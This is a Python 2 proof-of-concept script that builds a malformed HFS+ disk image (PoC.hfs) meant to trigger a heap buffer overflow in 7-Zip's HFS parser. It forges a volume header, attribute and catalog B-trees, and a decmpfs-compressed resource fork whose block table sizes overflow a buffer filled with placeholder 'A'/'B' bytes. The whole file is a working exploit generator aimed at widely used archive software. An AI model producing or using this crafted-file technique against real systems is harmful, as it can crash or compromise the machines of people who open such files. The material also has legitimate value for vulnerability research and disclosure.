from ctypes import *
from io import BytesIO
import struct 

class BTNodeDescriptor(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("fLink",c_uint32),
        ("bLink",c_uint32),
        ("kind",c_ubyte),
        ("height",c_byte),
        ("numRecords",c_uint16),
        ("reserved",c_uint16)
        ]

class BTHeaderRec(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("treeDepth",c_uint16),
        ("rootNode",c_uint32),
        ("leafRecords",c_uint32),
        ("firstLeafNode",c_uint32),
        ("lastLeafNode",c_uint32),
        ("nodeSize",c_uint16),
        ("maxKeyLength",c_uint16),
        ("totalNodes",c_uint32),
        ("freeNodes",c_uint32),
        ("reserved1",c_uint16),
        ("clumpSize",c_uint32),
        ("btreeType",c_ubyte),
        ("keyCompareType",c_ubyte),
        ("attributes",c_uint32),
        ("reserved3",c_uint32 * 16)        
        ]

class HFSPlusExtentDescriptor(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("startBlock",c_uint32),
        ("blockCount",c_uint32)
        ]

HFSPlusExtentRecord = HFSPlusExtentDescriptor * 8

class HFSPlusForkData(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("logicalSize",c_uint64),
        ("clumpSize",c_uint32),
        ("totalBlocks",c_uint32),
        ("extents",HFSPlusExtentRecord)
        ]
    
class HFSPlusVolumeHeader(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("Header",c_byte*2),
        ("Version",c_uint16),
        ("Attr",c_uint32),
        ("LastMountedVersion",c_uint32),
        ("JournalInfoBlock",c_uint32),
        ("CTime",c_uint32),
        ("MTime",c_uint32),
        ("BackupTime",c_uint32),
        ("CheckedTime",c_uint32),
        ("fileCount",c_uint32), # can't be bigger than ((UInt32)1 << 30)
        ("folderCount",c_uint32), # can't be bigger than ((UInt32)1 << 29)
        ("blockSize",c_uint32),
        ("totalBlocks",c_uint32),
        ("freeBlocks",c_uint32),
        ("nextAllocation",c_uint32),
        ("rsrcClumpSize",c_uint32),
        ("dataClumpSize",c_uint32),
        ("nextCatalogID",c_uint32),
        ("writeCount",c_uint32),
        ("encodingsBitmap",c_uint64),
        ("finderInfo",c_uint32 * 8),
        ("allocationFile",HFSPlusForkData),
        ("extentsFile",HFSPlusForkData),
        ("catalogFile",HFSPlusForkData),
        ("attributesFile",HFSPlusForkData),
        ("startupFile",HFSPlusForkData)
        ]

class AttrHeaderData(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("keyLen",c_uint16),
        ("pad",c_uint16),
        ("fileID",c_uint32),
        ("startBlock",c_uint32),
        ("nameLen",c_uint16)
        ]

class AttrHeaderRecord(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("recordType",c_uint32),
        ("pad",c_byte*8),
        ("dataSize",c_uint32)
        ]

class CatalogHeaderData(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("keyLen",c_uint16),
        ("parentID",c_uint32),
        ("nameLen",c_uint16)
        ]

class ExtendedFileInfo(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("reserved1",c_int16*4),
        ("extendedFinderFlags",c_int16),
        ("reserved2",c_int16),
        ("putAwayFolderID",c_int32)
        ]
class Point(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("v",c_int16),
        ("h",c_int16)
        ]

class OSType(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("osType",c_ubyte * 4)
        ]

class FileInfo(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("fileType",OSType),
        ("fileCreator",OSType),
        ("finderFlags",c_uint16),
        ("location",Point),
        ("reservedField",c_uint16),
        ]

class HFSPlusBSDInfo(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("ownerID",c_int32),
        ("groupID",c_int32),
        ("adminFlags",c_ubyte),
        ("ownerFlags",c_ubyte),
        ("fileMode",c_uint16),
        ("special",c_uint32)
        ]

class CatalogFile(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("recordType",c_int16),
        ("flags",c_uint16),
        ("reserved1",c_uint32),
        ("fileID",c_uint32),
        ("createDate",c_uint32),
        ("contentModDate",c_uint32),
        ("attributeModDate",c_uint32),
        ("accessDate",c_uint32),
        ("backupDate",c_uint32),
        ("permissions",HFSPlusBSDInfo),
        ("userInfo",FileInfo),
        ("finderInfo",ExtendedFileInfo),
        ("textEncoding",c_uint32),
        ("reserved2",c_uint32),
        ("dataFork",HFSPlusForkData),
        ("resourceFork",HFSPlusForkData)
        ]

class DecmpfsHeader(BigEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("magic",c_uint32),
        ("compressionType",c_uint32),
        ("fileSize",c_uint64),
        ]


def printFields(structObj):
    for field_name, field_type in structObj._fields_:
        print field_name, getattr(structObj,field_name)

class HFS(object):
    def __init__(self):
        self.__content = BytesIO()

    def addPadding(self,value,size):
        self.__content.write(value*size);

    def getContent(self):
        self.__content.seek(0)
        content = self.__content.read()
        return content

    def addStruct(self,obj): #temporary solution
        print self.__content.write(obj)

    def seek(self,offset):
        return self.__content.seek(offset)

    @staticmethod
    def blockSizeToLog(blockSize):
        for i in range(9,32):
            if (1<<i) == blockSize:
                return i
        return -1
        


class FileAttributes(object):    

    NODE_SIZE = 512

    def __init__(self):
        self.__offset = 0
        self.__content = BytesIO()
        #aligment
        self.__content.write("\x00"*FileAttributes.NODE_SIZE)
        self.__content.seek(0)
        ####
        desc = BTNodeDescriptor() # any, 7zip does not parse it
        memset(addressof(desc),0x41,sizeof(desc))   
        self.__content.write(desc)
        ###
        self.__hr   = BTHeaderRec()
        self.__hr.firstLeafNode = 1
        self.__hr.nodeSize = FileAttributes.NODE_SIZE # sizeLog    
        self.__hr.totalNodes = 1 
        self.__content.write(self.__hr)
        
        #align to node size
        self.__content.seek(FileAttributes.NODE_SIZE)

    def add(self, name, itemData = None, last = False):
        #constants
        kHeadSize = 14
        kRecordHeaderSize = 16
        kAttrRecordType_Inline = 0x10

        #Space & add new node
        self.__hr.totalNodes += 1
        
        #Create Node
        node = BytesIO()
        node.write("\x00" * FileAttributes.NODE_SIZE)
        node.seek(0)

        #NODE #1    
        desc = BTNodeDescriptor()
        desc.numRecords = 1
        desc.kind = 0xFF #nodeType_leaf
        if last:
            desc.fLink = 0        
        else:
            desc.fLink = self.__hr.totalNodes
        node.write(desc)

        nodeDataOffset = sizeof(desc)    

        #data
        data = AttrHeaderData()
        keyString  = name   
        data.fileID = 0x31337 if itemData else 0xdeadbeef
        data.startBlock = 0
        data.nameLen = len(keyString)
        data.keyLen = kHeadSize - 2 + data.nameLen * 2
        node.write(data)

        #name string
        node.write( unicode(keyString).encode("utf-16be") )

        record = AttrHeaderRecord()
        record.recordType = kAttrRecordType_Inline
        record.dataSize = 16
        node.write(record)
        
        #itemData
        if itemData:
            node.write(itemData)

        #offsets   
        offsets = struct.pack(">H",nodeDataOffset+kHeadSize + kRecordHeaderSize + data.keyLen + record.dataSize) #offsetNext because 7zip calculates record size based on difference between values of record offsets we need to put at least 2 offsets
        offsets += struct.pack(">H",nodeDataOffset) #offset
        node.seek(FileAttributes.NODE_SIZE - len(offsets))
        node.write(offsets)
        
        #add to rest of attributes
        node.seek(0)
        self.__content.write( node.read() )

    def getContent(self):
        #update content first
        self.__content.seek( sizeof(BTNodeDescriptor()) )
        self.__content.write( self.__hr )
        self.__content.seek(0)
        return self.__content.read()


            
def generateExploit():
 #region header
    fw = file(r'PoC.hfs','wb')
    hfs = BytesIO()
    OVERFLOW_VALUE = 0x10040
    #set header
    header = HFSPlusVolumeHeader()
    memset(addressof(header),0,sizeof(header))
    #Setting up header
    memmove(header.Header,"H+",2)
    header.Version = 4
    header.fileCount = 1
    header.folderCount = 0
    header.blockSize = 1024
    header.totalBlocks = 0x11223344 #updated later
    header.freeBlocks  = 0x0
    
    blockSizeLog = HFS.blockSizeToLog(header.blockSize)    
    
    forkDataOffset = 1
    if header.blockSize <= 0x400:
       forkDataOffset = ( 0x400 / header.blockSize ) + 1
#endregion

#region attribute
    kMethod_Attr     = 3; #// data stored in attribute file
    kMethod_Resource = 4; #// data stored in resource fork

    #attributesFile offset        
    attributesOffset = forkDataOffset 
    print("attributesOffset : ",attributesOffset)
    attributes = FileAttributes()

    #SPRAY
    #for i in range(0,50):        
    #   attributes.add("X"*( (0x20 / 2)-1 ) )

    decmpfsHeader =  DecmpfsHeader()
    decmpfsHeader.magic = struct.unpack("I", struct.pack(">I",0x636D7066) )[0] #magic == "fpmc"
    decmpfsHeader.compressionType = struct.unpack("I", struct.pack(">I",kMethod_Resource) )[0]
    decmpfsHeader.fileSize = struct.unpack("Q", struct.pack(">Q",0x10000) )[0] 
    attributes.add("com.apple.decmpfs",decmpfsHeader,True)
    attributesData = attributes.getContent()
    attributesDataLen = len(attributesData)

    #ForkData attributesFile
    totalBlocks = attributesDataLen / header.blockSize
    totalBlocks += 1 if ( attributesDataLen % header.blockSize ) else 0
    header.attributesFile.totalBlocks = totalBlocks
    header.attributesFile.logicalSize = header.attributesFile.totalBlocks * header.blockSize
    header.attributesFile.extents[0].startBlock = forkDataOffset
    header.attributesFile.extents[0].blockCount = header.attributesFile.totalBlocks

    #increase fork offset
    forkDataOffset += header.attributesFile.totalBlocks

#endregion

#region catalog

    catalogOffset = forkDataOffset
    print("catalogOffset : ", catalogOffset)
    kHeadSize = 14
    kBasicRecSize = 0x58
    kAttrRecordType_Inline = 0x10

    NODE_SIZE = 512
    catalog = BytesIO()
    catalog.write("\x00" * NODE_SIZE)
    catalog.seek(0)

    desc = BTNodeDescriptor() # any, 7zip does not parse it
    memset(addressof(desc),0x42,sizeof(desc))
    catalog.write(desc)

    hr   = BTHeaderRec()
    hr.firstLeafNode = 1
    hr.nodeSize = NODE_SIZE # sizeLog
    hr.totalNodes = 2        
    catalog.write(hr)

    #align
    catalog.seek( NODE_SIZE )

    #Create Node
    catalogNode = BytesIO()
    catalogNode.write( "\x00" * NODE_SIZE )
    catalogNode.seek(0)
    desc = BTNodeDescriptor()    
    desc.numRecords = 1
    desc.kind = 0xFF #nodeType_leaf
    desc.fLink = 0
    catalogNode.write(desc)
    
    data = CatalogHeaderData()
    keyString = "icewall"
    data.nameLen = len(keyString)
    data.parentID = 0x11223344
    data.keyLen = data.nameLen * 2 + 6
    catalogNode.write(data)
    catalogNode.write( unicode(keyString).encode("utf-16be") )    

    RECORD_TYPE_FILE = 2 
    item = CatalogFile()
    item.recordType = RECORD_TYPE_FILE
    item.fileID = 0x31337
    #data fork
    item.dataFork.logicalSize = 0
    item.dataFork.totalBlocks = 0
    item.dataFork.extents[0].startBlock = 0
    item.dataFork.extents[0].blockCount = 0

    totalBlocks = OVERFLOW_VALUE / header.blockSize
    totalBlocks += 1 if ( OVERFLOW_VALUE % header.blockSize ) else 0
    print ("resource fork total blocks : 0x%x" % totalBlocks)
    #resource fork    
    item.resourceFork.totalBlocks = totalBlocks
    item.resourceFork.logicalSize = item.resourceFork.totalBlocks * header.blockSize
    item.resourceFork.extents[0].startBlock = catalogOffset + 1# just after catalog
    item.resourceFork.extents[0].blockCount = totalBlocks
    catalogNode.write(item)

    #offsets   
    nodeDataOffset = sizeof(desc)    
    offsets = struct.pack(">H",nodeDataOffset + kBasicRecSize + 22 + 0x50 * 2) #offsetNext because 7zip calculates record size based on difference between values of record offsets we need to put at least 2 offsets
    offsets += struct.pack(">H",nodeDataOffset) #offset
    catalogNode.seek(hr.nodeSize - len(offsets))
    catalogNode.write(offsets)    
    catalogNode.seek(0)
    catalog.write(  catalogNode.read() )
    catalog.seek( 0 )
    catalogData = catalog.read()

    header.catalogFile.totalBlocks = 1 #FIXED!!! remember
    header.catalogFile.logicalSize = header.catalogFile.totalBlocks * header.blockSize
    header.catalogFile.extents[0].startBlock = forkDataOffset
    header.catalogFile.extents[0].blockCount = header.catalogFile.totalBlocks

    forkDataOffset += header.catalogFile.totalBlocks

#endregion

#region resource

    #resource fork data    
    resourceOffset = forkDataOffset
    print("resource : ",resourceOffset)
    kHeaderSize = 0x100
    resourceFork = BytesIO()
    resourceFork.write("\x00" * kHeaderSize)
    resourceFork.seek(0)

    numBlocks = 2
    dataSize2 = OVERFLOW_VALUE + 0x20 #value used to overflow
    mapSize  = 50 
    mapPos   = item.resourceFork.logicalSize - mapSize
    dataSize = dataSize2 + 4
    dataPos  = mapPos - dataSize       
    print("mapSize : 0x%x\nmapPos : 0x%x\ndataSize : 0x%x\ndataPos : 0x%x\nitem.resourceFork.logicalSize : 0x%x" % (mapSize,mapPos,dataSize,dataPos,item.resourceFork.logicalSize) )
    resourceFork.write( struct.pack(">I",dataPos) ) # dataPos
    resourceFork.write( struct.pack(">I", mapPos) )# mapPos
    resourceFork.write( struct.pack(">I",dataSize) ) # dataSize
    resourceFork.write( struct.pack(">I",mapSize) ) # mapSize    
    #offset + 256    
    resourceFork.seek(kHeaderSize) 
    resourceFork.write(struct.pack(">I",dataSize2) )
    resourceFork.write(struct.pack("<I",numBlocks) )
    #table
    size1 = OVERFLOW_VALUE 
    offset1 = (numBlocks << 3) + 4
    offset2 = size1 + offset1
    size2 =  dataSize2 - offset2
    resourceFork.write(struct.pack("<I",offset1) )
    resourceFork.write(struct.pack("<I",size1) )
    resourceFork.write(struct.pack("<I",offset2) )
    resourceFork.write(struct.pack("<I",size2) )
    resourceFork.write("\x0F") # just to quickly end function
    resourceFork.write("A"*(size1-1)) #payload
    resourceFork.write("B"*0x20000) #additional data
    resourceFork.seek(0)
    resourceData = resourceFork.read()

#endregion

    #Write 7zip header
    header.totalBlocks = header.attributesFile.totalBlocks + header.catalogFile.totalBlocks + item.resourceFork.totalBlocks     
    hfs.write("\x00" * (header.blockSize * header.totalBlocks) ) # just to make space for everything
    hfs.seek(0x400) # 7zip requires that space
    hfs.write(header)

    hfs.seek(attributesOffset * header.blockSize)
    hfs.write(attributesData)

    hfs.seek(catalogOffset * header.blockSize)
    hfs.write(catalogData)

    hfs.seek(resourceOffset * header.blockSize)
    hfs.write(resourceData)
    
    hfs.seek(0)

    fw.write(hfs.read())
    fw.close()

if __name__ == "__main__":
    generateExploit()
    

    
